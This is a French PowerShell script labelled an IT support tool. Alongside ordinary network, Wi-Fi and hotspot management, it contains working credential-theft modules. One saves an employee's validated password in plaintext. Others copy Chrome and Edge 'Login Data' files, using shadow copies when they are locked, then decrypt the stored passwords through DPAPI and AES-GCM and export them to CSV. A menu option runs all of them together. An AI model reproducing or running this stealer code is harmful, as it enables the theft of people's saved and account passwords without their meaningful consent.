# =============================================
# IT SUPPORT TOOL - VERSION FINALE PROPRE
# Compatible PowerShell 5.1 / 7+
# Niveau 5 Cybersécurité / HACH
# =============================================

#Requires -RunAsAdministrator

$Host.UI.RawUI.WindowTitle = "IT Support Tool - Final Clean"

$MachineName  = $env:COMPUTERNAME
$CurrentUser  = $env:USERNAME
$Date         = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"

# ── Vérification droits admin ──────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERREUR] Ce script doit être exécuté en tant qu'Administrateur." -ForegroundColor Red
    exit 1
}

# ── Création du dossier d'export ───────────────────────────────────────────
try {
    New-Item -Path $ExportFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Host "Dossier créé : $ExportFolder" -ForegroundColor Green
} catch {
    Write-Host "[ERREUR] Impossible de créer le dossier d'export : $_" -ForegroundColor Red
    exit 1
}

Write-Host "`n=== IT SUPPORT TOOL - VERSION FINALE PROPRE ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser`n" -ForegroundColor Yellow

# ==============================================================================
# MODULE 1 — SAUVEGARDE MOT DE PASSE EMPLOYE (LogonUser Win32 API)
# ==============================================================================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== [MODULE 1] SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan

    $emp = Read-Host "Nom utilisateur (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($emp)) { $emp = $CurrentUser }

    $domain = Read-Host "Domaine (vide = machine locale)"
    if ([string]::IsNullOrWhiteSpace($domain)) { $domain = "." }

    $logonType = 3   # LOGON32_LOGON_NETWORK

    for ($i = 1; $i -le 3; $i++) {
        $pass  = Read-Host "Mot de passe de $emp (tentative $i/3)" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                     [Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        try {
            if ([Win32]::LogonUser($emp, $domain, $plain, $logonType, 0, [ref]$token)) {
                [Win32]::CloseHandle($token) | Out-Null

                $file = "$ExportFolder\Password_${emp}_${Date}.txt"
                @"
Utilisateur : $emp
Domaine     : $domain
Mot de passe: $plain
Date        : $(Get-Date)
Machine     : $MachineName
"@ | Out-File $file -Encoding UTF8

                Write-Host "✓ Mot de passe validé et sauvegardé : $file" -ForegroundColor Green
                return
            } else {
                $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Host "✗ Incorrect - code erreur Win32 : $err ($i/3)" -ForegroundColor Red
            }
        } catch {
            Write-Host "[ERREUR] LogonUser : $_" -ForegroundColor Red
        }
    }
    Write-Host "Nombre maximum de tentatives atteint." -ForegroundColor Red
}

# ==============================================================================
# MODULE 2 — EXPORT FICHIER BRUT NAVIGATEUR (Login Data)
# ==============================================================================
function Export-BrowserPasswords {
    Write-Host "`n=== [MODULE 2] EXPORT NAVIGATEUR (fichier brut) ===" -ForegroundColor Cyan
    Write-Host "1. Chrome`n2. Edge"
    $nav = Read-Host "Choix"

    switch ($nav) {
        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $base)) {
        Write-Host "$browser non trouvé sur cette machine." -ForegroundColor Red
        return
    }

    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }

    if ($profiles.Count -eq 0) {
        Write-Host "Aucun profil trouvé." -ForegroundColor Red
        return
    }

    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $list = @()
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name
        $pref = Join-Path $p.FullName "Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $list += [PSCustomObject]@{ Index = $i; Folder = $p; Display = $displayName }
    }

    $num = Read-Host "`nNuméro du profil à exporter"
    $selected = $list[$num - 1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $dbPath = Join-Path $selected.Folder.FullName "Login Data"
    if (-not (Test-Path $dbPath)) {
        Write-Host "Aucun fichier 'Login Data' dans ce profil." -ForegroundColor Red
        return
    }

    $cleanName = $selected.Display -replace '[^\w]', '_'
    $destDb = "$ExportFolder\${browser}_${cleanName}_LoginData_${Date}.db"

    try {
        Copy-Item $dbPath $destDb -Force -ErrorAction Stop
        Write-Host "✓ Fichier Login Data copié : $destDb" -ForegroundColor Green
    } catch {
        Write-Host "  Fichier verrouillé, tentative via VSS..." -ForegroundColor Yellow
        try {
            $shadow = (Get-WmiObject -Class Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1).DeviceObject
            if ($shadow) {
                $shadowPath = "$shadow\" + ($dbPath -replace "^[A-Z]:\\", "")
                Copy-Item $shadowPath $destDb -Force -ErrorAction Stop
                Write-Host "✓ Copié via VSS : $destDb" -ForegroundColor Green
            }
        } catch {
            Write-Host "[ERREUR] VSS échoué : $_" -ForegroundColor Red
        }
    }

    Write-Host "`n[INFO] Fichier brut exporté. Utilise le module 2.5 pour le déchiffrement." -ForegroundColor DarkYellow
}

# ==============================================================================
# MODULE 2.5 — DÉCHIFFREMENT AUTOMATIQUE (DPAPI + AES-GCM si PS7)
# ==============================================================================
function Decrypt-BrowserPasswords {
    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT AUTOMATIQUE CHROME/EDGE ===" -ForegroundColor Cyan

    # Charger System.Security (indispensable pour ProtectedData)
    try {
        Add-Type -AssemblyName System.Security -ErrorAction Stop
        Write-Host "✓ Assembly System.Security chargé" -ForegroundColor Green
    } catch {
        Write-Host "[ERREUR] Impossible de charger System.Security. Le déchiffrement est impossible." -ForegroundColor Red
        return
    }

    # Détection de la présence de AesGcm (PowerShell 7+)
    $aesGcmAvailable = $false
    try {
        $null = [System.Security.Cryptography.AesGcm]
        $aesGcmAvailable = $true
        Write-Host "✓ AES-GCM disponible (PowerShell 7+)" -ForegroundColor Green
    } catch {
        Write-Host "[AVERTISSEMENT] AES-GCM non disponible (PowerShell 5.1)." -ForegroundColor DarkYellow
        Write-Host "             Seuls les mots de passe au format DPAPI (anciens) pourront être déchiffrés." -ForegroundColor DarkYellow
        Write-Host "             Pour déchiffrer les mots de passe modernes, installez PowerShell 7 :" -ForegroundColor DarkYellow
        Write-Host "             https://aka.ms/powershell" -ForegroundColor Cyan
    }

    # Choix du navigateur
    Write-Host "1. Chrome`n2. Edge"
    $choice = Read-Host "Choix"

    switch ($choice) {
        "1" { $browser = "Chrome"; $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $basePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $basePath)) {
        Write-Host "$browser non trouvé." -ForegroundColor Red
        return
    }

    # Lister les profils
    $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $list = @()
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name
        $pref = Join-Path $p.FullName "Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $list += [PSCustomObject]@{ Index = $i; Folder = $p; Display = $displayName }
    }

    $num = Read-Host "`nNuméro du profil"
    $selected = $list[$num-1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $loginDb = Join-Path $selected.Folder.FullName "Login Data"
    $localStatePath = Join-Path $selected.Folder.Parent.FullName "Local State"

    if (-not (Test-Path $loginDb)) {
        Write-Host "Fichier Login Data introuvable." -ForegroundColor Red
        return
    }

    $outputCsv = "$ExportFolder\${browser}_Passwords_Decrypted_${Date}.csv"

    try {
        # Récupération de la Master Key (si AES-GCM disponible)
        $masterKey = $null
        if ($aesGcmAvailable -and (Test-Path $localStatePath)) {
            $localState = Get-Content $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
            if ($localState.os_crypt.encrypted_key) {
                $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
                Write-Host "✓ Master key récupérée (AES-GCM)" -ForegroundColor Green
            }
        } elseif (-not $aesGcmAvailable) {
            Write-Host "AES-GCM non disponible : seuls les anciens mots de passe (DPAPI) seront déchiffrés." -ForegroundColor DarkYellow
        }

        # Copie temporaire de la base SQLite
        $tempDb = "$env:TEMP\LoginData_$(Get-Random).db"
        Copy-Item $loginDb $tempDb -Force

        # Vérifier sqlite3.exe
        $sqlite = Get-Command sqlite3.exe -ErrorAction SilentlyContinue
        if (-not $sqlite) {
            Write-Host "[ERREUR] sqlite3.exe non trouvé !" -ForegroundColor Red
            Write-Host "Téléchargez-le depuis https://sqlite.org/download.html" -ForegroundColor Yellow
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            return
        }

        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value != '';"
        $rows = & sqlite3.exe $tempDb $query 2>$null

        $results = @()

        foreach ($row in $rows) {
            $f = $row -split '\|'
            if ($f.Count -ge 3) {
                $url = $f[0]
                $user = $f[1]
                $encHex = $f[2]
                $password = "[ERREUR_DECHIFFREMENT]"

                try {
                    # Convertir la chaîne hexadécimale en bytes
                    $encBytes = [byte[]]::new($encHex.Length / 2)
                    for ($j = 0; $j -lt $encHex.Length; $j += 2) {
                        $encBytes[$j/2] = [Convert]::ToByte($encHex.Substring($j, 2), 16)
                    }

                    # Tentative de déchiffrement selon le format
                    if ($masterKey -and $aesGcmAvailable) {
                        # Format AES-GCM (Chrome >= 80, Edge Chromium)
                        $password = Decrypt-AesGcm $encBytes $masterKey
                    } else {
                        # Ancien format DPAPI
                        $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, 'CurrentUser'))
                    }
                } catch {
                    # Échec : on laisse le message d'erreur
                }

                $results += [PSCustomObject]@{ URL = $url; Username = $user; Password = $password }
            }
        }

        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

        if ($results.Count -gt 0) {
            $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
            Write-Host "`n✓ $($results.Count) mots de passe traités (déchiffrés si possible) !" -ForegroundColor Green
            Write-Host "Fichier : $outputCsv" -ForegroundColor Green
        } else {
            Write-Host "Aucun mot de passe trouvé." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[ERREUR] $_" -ForegroundColor Red
        Write-Host "→ Assurez-vous d'exécuter ce script dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
    }
}

# Fonction de déchiffrement AES-GCM (ne fonctionne que sous PS7+)
function Decrypt-AesGcm($encryptedBytes, $masterKey) {
    if ($encryptedBytes.Length -lt 31) { return "[BLOB_TROP_COURT]" }
    $iv = $encryptedBytes[3..14]
    $cipher = $encryptedBytes[15..($encryptedBytes.Length - 17)]
    $tag = $encryptedBytes[($encryptedBytes.Length - 16)..($encryptedBytes.Length - 1)]

    $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
    $dec = [byte[]]::new($cipher.Length)
    $aes.Decrypt($iv, $cipher, $tag, $dec)
    return [System.Text.Encoding]::UTF8.GetString($dec)
}

# ==============================================================================
# MODULE 3 — BLOCAGE PARTAGE CONNEXION
# ==============================================================================
function Manage-Sharing {
    Write-Host "`n=== [MODULE 3] GESTION PARTAGE DE CONNEXION ===" -ForegroundColor Cyan
    Write-Host "1. Activer le partage (hotspot)"
    Write-Host "2. Désactiver le partage (hotspot)"
    Write-Host "3. BLOQUER complètement (désactivation admin de l'adaptateur virtuel)"
    $c = Read-Host "Choix"

    switch ($c) {
        "1" {
            netsh wlan set hostednetwork mode=allow | Out-Null
            netsh wlan start hostednetwork | Out-Null
            Write-Host "✓ Partage activé." -ForegroundColor Green
        }
        "2" {
            netsh wlan stop hostednetwork | Out-Null
            netsh wlan set hostednetwork mode=disallow | Out-Null
            Write-Host "✓ Partage désactivé." -ForegroundColor Yellow
        }
        "3" {
            # Désactiver adaptateur source Ethernet
            $ethernet = Get-NetAdapter | Where-Object {
                $_.InterfaceDescription -notlike "*Wi-Fi Direct*" -and
                $_.InterfaceDescription -notlike "*Wireless*" -and
                $_.InterfaceDescription -notlike "*Virtual*" -and
                $_.Status -eq "Up"
            }
            foreach ($nic in $ethernet) {
                try {
                    Disable-NetAdapter -Name $nic.Name -Confirm:$false -ErrorAction Stop
                    Write-Host "  Adaptateur source désactivé : $($nic.Name)" -ForegroundColor Yellow
                } catch {
                    Write-Host "  [AVERT] Impossible de désactiver $($nic.Name) : $_" -ForegroundColor DarkYellow
                }
            }

            # Forcer création adaptateur virtuel
            netsh wlan set hostednetwork mode=allow | Out-Null
            netsh wlan start hostednetwork | Out-Null
            Start-Sleep -Seconds 2

            # Détecter et désactiver l'adaptateur virtuel Wi-Fi Direct
            $virtual = Get-NetAdapter | Where-Object {
                $_.InterfaceDescription -like "*Wi-Fi Direct*" -or
                ($_.Name -like "*Local Area Connection*" -and $_.InterfaceDescription -like "*Microsoft*")
            }
            if ($virtual) {
                foreach ($v in $virtual) {
                    try {
                        Disable-NetAdapter -Name $v.Name -Confirm:$false -ErrorAction Stop
                        Write-Host "  Adaptateur virtuel bloqué : $($v.Name)" -ForegroundColor Red
                    } catch {
                        Write-Host "  [ERREUR] $($v.Name) : $_" -ForegroundColor Red
                    }
                }
            } else {
                Write-Host "  Aucun adaptateur virtuel détecté." -ForegroundColor DarkYellow
            }

            # Verrouillage registre
            try {
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings"
                if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
                Set-ItemProperty -Path $regPath -Name "HostedNetworkEnabled" -Value 0 -Type DWord -Force
                Write-Host "✓ PARTAGE BLOQUÉ (adaptateur virtuel désactivé + registre verrouillé)." -ForegroundColor Red
            } catch {
                Write-Host "  [AVERT] Verrouillage registre échoué : $_" -ForegroundColor DarkYellow
            }
        }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
}

# ==============================================================================
# MODULE 4 — GESTION WIFI
# ==============================================================================
function Manage-WiFi {
    Write-Host "`n=== [MODULE 4] GESTION WIFI ===" -ForegroundColor Cyan

    $wifi = Get-NetAdapter | Where-Object {
        ($_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*") -and
        $_.InterfaceDescription -notlike "*Wi-Fi Direct*"
    }
    if (-not $wifi) { Write-Host "Aucun adaptateur WiFi trouvé." -ForegroundColor Red; return }

    Write-Host "Adaptateur WiFi détecté : $($wifi.Name) [$($wifi.InterfaceDescription)]" -ForegroundColor White
    Write-Host "1. Activer WiFi"
    Write-Host "2. Désactiver WiFi (temporaire)"
    Write-Host "3. BLOQUER WiFi (désactivation admin)"
    $c = Read-Host "Choix"

    switch ($c) {
        "1" {
            try { Enable-NetAdapter -Name $wifi.Name -Confirm:$false -ErrorAction Stop; Write-Host "✓ WiFi activé." -ForegroundColor Green }
            catch { Write-Host "[ERREUR] $_" -ForegroundColor Red }
        }
        "2" {
            try { Disable-NetAdapter -Name $wifi.Name -Confirm:$false -ErrorAction Stop; Write-Host "✓ WiFi désactivé." -ForegroundColor Yellow }
            catch { Write-Host "[ERREUR] $_" -ForegroundColor Red }
        }
        "3" {
            try { netsh interface set interface name="$($wifi.Name)" admin=disabled | Out-Null; Write-Host "✓ WiFi BLOQUÉ." -ForegroundColor Red }
            catch { Write-Host "[ERREUR] netsh : $_" -ForegroundColor Red }
            # Verrouillage registre
            try {
                $nicGuid = (Get-NetAdapter -Name $wifi.Name).InterfaceGuid
                $regNic = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
                Get-ChildItem $regNic -ErrorAction SilentlyContinue | ForEach-Object {
                    $netCfgId = (Get-ItemProperty $_.PSPath -Name "NetCfgInstanceId" -ErrorAction SilentlyContinue).NetCfgInstanceId
                    if ($netCfgId -eq $nicGuid) {
                        Set-ItemProperty -Path $_.PSPath -Name "Characteristics" -Value 0x84 -Type DWord -Force
                        Write-Host "  Registre NIC verrouillé." -ForegroundColor DarkRed
                    }
                }
            } catch { Write-Host "  [AVERT] Verrouillage registre : $_" -ForegroundColor DarkYellow }
        }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
}

# ==============================================================================
# MODULE 5 — GESTION RÉSEAU
# ==============================================================================
function Manage-Network {
    Write-Host "`n=== [MODULE 5] GESTION RESEAU ===" -ForegroundColor Cyan

    $adapters = Get-NetAdapter | Where-Object { $_.Status -ne "Not Present" -and $_.InterfaceDescription -notlike "*Loopback*" }
    if ($adapters.Count -eq 0) { Write-Host "Aucun adaptateur réseau trouvé." -ForegroundColor Red; return }

    Write-Host "`nAdaptateurs disponibles :" -ForegroundColor Yellow
    for ($i = 0; $i -lt $adapters.Count; $i++) {
        $a = $adapters[$i]
        $status = if ($a.Status -eq "Up") { "↑ Actif" } else { "↓ $($a.Status)" }
        Write-Host "  $($i+1). $($a.Name)  [$($a.InterfaceDescription)]  — $status" -ForegroundColor White
    }

    $num = Read-Host "`nNuméro de l'adaptateur"
    $selected = $adapters[$num - 1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    Write-Host "`nAdaptateur sélectionné : $($selected.Name)" -ForegroundColor Cyan
    Write-Host "1. Passer en DHCP" "2. IP statique" "3. Redémarrer" "4. Désactiver" "5. Activer"
    Write-Host "6. Désinstaller (PnP)" "7. Réinitialiser pile réseau" "8. Refresh DHCP" "9. URGENCE (netsh pur)"
    $c = Read-Host "Choix"

    switch ($c) {
        "1" {
            netsh interface ip set address name="$($selected.Name)" source=dhcp | Out-Null
            netsh interface ip set dns name="$($selected.Name)" source=dhcp | Out-Null
            try { Set-NetIPInterface -InterfaceAlias $selected.Name -Dhcp Enabled -ErrorAction Stop } catch {}
            Write-Host "✓ DHCP activé." -ForegroundColor Green
            ipconfig /release $selected.Name 2>$null | Out-Null; ipconfig /renew $selected.Name 2>$null | Out-Null
        }
        "2" {
            $ip = Read-Host "IP"; $mask = Read-Host "Masque (longueur)"; $gw = Read-Host "Passerelle"; $dns1 = Read-Host "DNS1"; $dns2 = Read-Host "DNS2 (vide si aucun)"
            try {
                Get-NetIPAddress -InterfaceAlias $selected.Name -ErrorAction SilentlyContinue | Remove-NetIPAddress -Confirm:$false
                Get-NetRoute -InterfaceAlias $selected.Name -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Remove-NetRoute -Confirm:$false
                Set-NetIPInterface -InterfaceAlias $selected.Name -Dhcp Disabled -ErrorAction Stop
                New-NetIPAddress -InterfaceAlias $selected.Name -IPAddress $ip -PrefixLength ([int]$mask) -DefaultGateway $gw | Out-Null
                $dns = @($dns1); if ($dns2) { $dns += $dns2 }
                Set-DnsClientServerAddress -InterfaceAlias $selected.Name -ServerAddresses $dns
                Write-Host "✓ IP statique configurée." -ForegroundColor Green
            } catch { Write-Host "[ERREUR] $_" -ForegroundColor Red }
        }
        "3" { try { Disable-NetAdapter $selected.Name -Confirm:$false; Start-Sleep 2; Enable-NetAdapter $selected.Name -Confirm:$false; Write-Host "✓ Redémarré." } catch { Write-Host "[ERREUR] $_" } }
        "4" { try { Disable-NetAdapter $selected.Name -Confirm:$false; Write-Host "✓ Désactivé." } catch { Write-Host "[ERREUR] $_" } }
        "5" { try { Enable-NetAdapter $selected.Name -Confirm:$false; Write-Host "✓ Activé." } catch { Write-Host "[ERREUR] $_" } }
        "6" { $confirm = Read-Host "Confirmer désinstallation ? (O/N)"; if ($confirm -eq "O") { try { $pnp = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*$($selected.InterfaceDescription)*" } | Select-Object -First 1; if ($pnp) { Disable-PnpDevice -InstanceId $pnp.InstanceId -Confirm:$false; Write-Host "✓ Périphérique désactivé." } } catch { Write-Host "[ERREUR] $_" } } }
        "7" { Write-Host "Réinitialisation... Un redémarrage sera nécessaire."; netsh int ip reset; netsh winsock reset; ipconfig /flushdns }
        "8" { ipconfig /release $selected.Name; ipconfig /renew $selected.Name }
        "9" { netsh interface set interface name="$($selected.Name)" admin=enabled; netsh interface ip set address name="$($selected.Name)" source=dhcp; ipconfig /release $selected.Name; ipconfig /renew $selected.Name }
        default { Write-Host "Choix invalide." }
    }
}

# ==============================================================================
# MENU PRINCIPAL
# ==============================================================================
function Show-Menu {
    Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║       IT SUPPORT TOOL — MENU FINAL         ║" -ForegroundColor Magenta
    Write-Host "╠════════════════════════════════════════════╣" -ForegroundColor Magenta
    Write-Host "║  1. Sauvegarder mot de passe employé      ║" -ForegroundColor White
    Write-Host "║  2. Exporter Navigateur (brut)            ║" -ForegroundColor White
    Write-Host "║  2.5 Déchiffrer DPAPI (Auto AES-GCM)      ║" -ForegroundColor Green
    Write-Host "║  3. Gérer partage de connexion            ║" -ForegroundColor White
    Write-Host "║  4. Gérer WiFi                            ║" -ForegroundColor White
    Write-Host "║  5. Gestion réseau (DHCP/IP/NIC)          ║" -ForegroundColor White
    Write-Host "║  6. TOUT EXÉCUTER (1 + 2 + 2.5)           ║" -ForegroundColor Yellow
    Write-Host "║  Q. Quitter                               ║" -ForegroundColor Red
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Magenta
    return (Read-Host "Votre choix")
}

do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        "1"   { Save-EmployeePassword }
        "2"   { Export-BrowserPasswords }
        "2.5" { Decrypt-BrowserPasswords }
        "25"  { Decrypt-BrowserPasswords }
        "3"   { Manage-Sharing }
        "4"   { Manage-WiFi }
        "5"   { Manage-Network }
        "6"   { Save-EmployeePassword; Export-BrowserPasswords; Decrypt-BrowserPasswords }
        "Q"   { Write-Host "`nAu revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
    if ($choice.ToUpper() -ne "Q") { Read-Host "`nAppuyez sur Entrée pour continuer..." }
} while ($choice.ToUpper() -ne "Q")

Write-Host "`nTerminé. Tous les exports sont dans : $ExportFolder" -ForegroundColor Green
